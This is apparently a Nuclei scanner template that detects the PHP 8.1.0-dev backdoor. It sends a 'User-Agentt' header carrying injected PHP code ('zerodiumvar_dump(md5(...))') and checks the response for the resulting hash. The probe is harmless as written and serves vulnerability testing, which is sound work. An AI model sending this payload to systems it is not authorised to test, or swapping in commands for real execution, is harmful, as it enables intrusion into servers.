id: php8-1-dev-rce
info:
  name: PHP 8.1.0-dev Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce,php

variables:
  t1: "{{rand_int(1000, 9999)}}"
  t3: "{{md5(t1)}}"

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        User-Agentt: zerodiumvar_dump(md5({{t1}}));

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "text/html"
      - type: word
        part: body
        words:
          - "{{t3}}"
